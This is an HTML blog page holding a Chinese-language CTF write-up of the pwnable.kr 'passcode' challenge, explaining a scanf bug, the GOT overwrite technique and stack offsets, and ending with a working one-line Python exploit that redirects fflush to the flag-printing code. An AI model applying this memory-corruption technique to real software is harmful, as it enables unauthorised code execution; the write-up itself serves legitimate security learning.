@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>01,pwn学习系列 | D&#39;Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta name="keywords" content="二进制安全,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="01,pwn学习系列">
+<meta property="og:url" content="http://www.duwentao.top/2019/05/29/pwn学习01/index.html">
+<meta property="og:site_name" content="D&#39;Blog">
+<meta property="og:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529145233049.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529145939911.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529150012893.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529150245951.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529150340207.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529152515029.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529154601682.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529154522728.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529154822923.png">
+<meta property="og:image" content="http://www.duwentao.top/images/pwn/01/image-20190529154329976.png">
+<meta property="og:updated_time" content="2019-06-09T02:23:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="01,pwn学习系列">
+<meta name="twitter:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta name="twitter:image" content="http://www.duwentao.top/images/pwn/01/image-20190529145233049.png">
+  
+    <link rel="alternate" href="/atom.xml" title="D&#39;Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">D&#39;Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://www.duwentao.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-pwn学习01" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/29/pwn学习01/" class="article-date">
+  <time datetime="2019-05-28T21:09:07.000Z" itemprop="datePublished">2019-05-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      01,pwn学习系列
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <html><body style="padding: 20px;"><marquee><span style="font-weight: bolder;font-size: 20px;color: red;"><a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber" target="_blank" rel="noopener"><font color="red">声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负</font></a></span></marquee></body></html>
+
+<a id="more"></a>
+
+<h1 id="一，题目地址"><a href="#一，题目地址" class="headerlink" title="一，题目地址"></a>一，题目地址</h1><p><a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a></p>
+<p>第四题：题目描述：</p>
+<blockquote>
+<p>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?</p>
+<p>ssh <a href="mailto:passcode@pwnable.kr" target="_blank" rel="noopener">passcode@pwnable.kr</a> -p2222 (pw:guest)</p>
+</blockquote>
+<h2 id="二，开始研究"><a href="#二，开始研究" class="headerlink" title="二，开始研究"></a>二，开始研究</h2><p>ssh连接,连接成功以后看到三个文件，直接cat flag，发现被拒绝了</p>
+<p><img src="/../images/pwn/01/image-20190529145233049.png" alt="image-20190529145233049"></p>
+<p>程序源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-开始分析"><a href="#1-开始分析" class="headerlink" title="1,开始分析"></a>1,开始分析</h2><p>对源码进行分析：发现 fflush这个函数不知道什么意思，<a href="http://c.biancheng.net/cpp/html/2506.html" target="_blank" rel="noopener">最终找到解释点次查看</a></p>
+<p>fflush()不是标准库文件，经测试，VC6.0完美支持，GCC（GCC4.6.2）不支持。</p>
+<p>fflush()用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为：<br>    int fflush(FILE* stream);</p>
+<p>代码一：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</span><br><span class="line">    c = getchar();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a = %d, c = %c \n"</span>, a, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/pwn/01/image-20190529145939911.png" alt="image-20190529145939911"></p>
+<p><img src="/../images/pwn/01/image-20190529150012893.png" alt="image-20190529150012893"></p>
+<p>代码二：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    c = getchar();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a = %d, c = %c \n"</span>, a, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/pwn/01/image-20190529150245951.png" alt="image-20190529150245951"></p>
+<p><img src="/../images/pwn/01/image-20190529150340207.png" alt="image-20190529150340207"></p>
+<p>对比上面的代码：</p>
+<p>代码一没有清空输入缓冲区，回车时，将123赋值给a，缓冲区剩下abc，接着执行getchar()，发现缓冲区有内容，就无需等待用户输入，直接读取了，将 ‘a’ 赋给 c。</p>
+<p>代码二执行到fflush()，清空缓冲区，getchar()发现缓冲区没有内容，需要等待用户输入，所以必须输入两次。</p>
+<h2 id="2，分析我们的题目"><a href="#2，分析我们的题目" class="headerlink" title="2，分析我们的题目"></a>2，分析我们的题目</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>1, 通关上面这个代码我们发现如果passcode1==338150 &amp;&amp; passcode2==13371337就可以拿到flag；</p>
+<p>2, 但是login()函数中的scanf(“%d”, passcode1);没有加&amp;(取地址符合)；没有办法把338150和13371337直接输入进去。</p>
+<p><font color="red">3, 但由于scanf没加&amp;时会从栈中读取4个字节当scanf取的地址，并把scanf后输入的的内容存到那里，于是我们可以修改栈中的数据，写一个任意4字节的地址进去，来充当scanf取的地址</font></p>
+<p>4, 于是可以利用GOT覆写技术，用一个GOT表中的函数地址来充当scanf取的地址，然后把system(“/bin/cat flag”)这条指令的地址通过scanf写到这个函数中，当这个函数被调用时，就会直接跳到system(“/bin/cat flag”)</p>
+<p><strong>GOT覆写技术：</strong></p>
+<p>原理：由于<strong>GOT表</strong>是可写的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。</p>
+<p><strong>GOT表：</strong></p>
+<p>概念：每一个外部定义的符号在全局偏移表（Global offset Table ）中有相应的条目，GOT位于ELF的数据段中，叫做GOT段。</p>
+<p>作用：把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（rtld）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用rtld。</p>
+<h2 id="3-首先查看一下GOT表中都有哪些函数"><a href="#3-首先查看一下GOT表中都有哪些函数" class="headerlink" title="3,首先查看一下GOT表中都有哪些函数"></a>3,首先查看一下GOT表中都有哪些函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -r passcode</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/Roland_Sun/article/details/37581715" target="_blank" rel="noopener">readelf工具用法</a></p>
+<p><img src="/../images/pwn/01/image-20190529152515029.png" alt="image-20190529152515029"></p>
+<p>看到了printf, fflush,exit 并且找到了system函数的偏移量，之后就是要确定变量name和passcode1，passcode2的位置。</p>
+<p><img src="/../images/pwn/01/image-20190529154601682.png" alt="image-20190529154601682"></p>
+<p><img src="/../images/pwn/01/image-20190529154522728.png" alt="image-20190529154522728"></p>
+<p><img src="/../images/pwn/01/image-20190529154822923.png" alt="image-20190529154822923"></p>
+<p>找到name位于ebp-0x70，passcode1位于ebp-0x10，passcode2位于ebp-0xc<br>，name与passcode1之间隔了0x70-0x10=96个字节，用fflush()的地址覆盖passcode1后，scanf(“%d”，&amp;fflush())将会把之后的输入写入到GOT表中，于是把login()中system(“/bin/cat flag”)的地址转换成十进制写进去，当程序调用fflush()的时候就会执行system()</p>
+<h2 id="4-得到flag"><a href="#4-得到flag" class="headerlink" title="4,得到flag"></a>4,得到flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;134514147\n&apos;&quot; | ./passcode</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/pwn/01/image-20190529154329976.png" alt="image-20190529154329976"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.duwentao.top/2019/05/29/pwn学习01/" data-id="cjwsmhkv1000ldkfy507h02az" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/二进制安全/">二进制安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/05/13/xxe总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">xxe总结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/">node.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php反序列化漏洞/">php反序列化漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vps/">vps</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-靶机/">web-靶机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-sql-injection/">web_sql_injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-upload-include/">web_upload_include</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二进制安全/">二进制安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客/">博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/变量覆盖/">变量覆盖</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/支付漏洞/">支付漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含漏洞/">文件包含漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈/">栈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/私有云/">私有云</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/竞赛/">竞赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/脚本/">脚本</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自考/">自考</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/逻辑漏洞/">逻辑漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/队列/">队列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机/">靶机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机渗透/">靶机渗透</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 12px;">CTF</a> <a href="/tags/access/" style="font-size: 10px;">access</a> <a href="/tags/c/" style="font-size: 14px;">c++</a> <a href="/tags/ctf/" style="font-size: 12px;">ctf</a> <a href="/tags/mysql/" style="font-size: 16px;">mysql</a> <a href="/tags/node-js/" style="font-size: 10px;">node.js</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/php反序列化漏洞/" style="font-size: 10px;">php反序列化漏洞</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/sql注入/" style="font-size: 18px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssrf/" style="font-size: 10px;">ssrf</a> <a href="/tags/vps/" style="font-size: 10px;">vps</a> <a href="/tags/web-靶机/" style="font-size: 12px;">web-靶机</a> <a href="/tags/web-sql-injection/" style="font-size: 10px;">web_sql_injection</a> <a href="/tags/web-upload-include/" style="font-size: 10px;">web_upload_include</a> <a href="/tags/web安全/" style="font-size: 20px;">web安全</a> <a href="/tags/web漏洞/" style="font-size: 10px;">web漏洞</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/二进制安全/" style="font-size: 10px;">二进制安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a> <a href="/tags/变量覆盖/" style="font-size: 10px;">变量覆盖</a> <a href="/tags/支付漏洞/" style="font-size: 10px;">支付漏洞</a> <a href="/tags/数据结构/" style="font-size: 12px;">数据结构</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/文件包含漏洞/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/栈/" style="font-size: 10px;">栈</a> <a href="/tags/私有云/" style="font-size: 10px;">私有云</a> <a href="/tags/竞赛/" style="font-size: 10px;">竞赛</a> <a href="/tags/脚本/" style="font-size: 10px;">脚本</a> <a href="/tags/自考/" style="font-size: 14px;">自考</a> <a href="/tags/逻辑漏洞/" style="font-size: 10px;">逻辑漏洞</a> <a href="/tags/队列/" style="font-size: 10px;">队列</a> <a href="/tags/靶机/" style="font-size: 10px;">靶机</a> <a href="/tags/靶机渗透/" style="font-size: 12px;">靶机渗透</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/05/29/pwn学习01/">01,pwn学习系列</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/13/xxe总结/">xxe总结</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/09/PHP变量覆盖漏洞总结/">PHP变量覆盖总结</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/21/php反序列化漏洞/">php反序列化漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/文件包含漏洞总结/">文件包含漏洞总结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 杜文涛<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
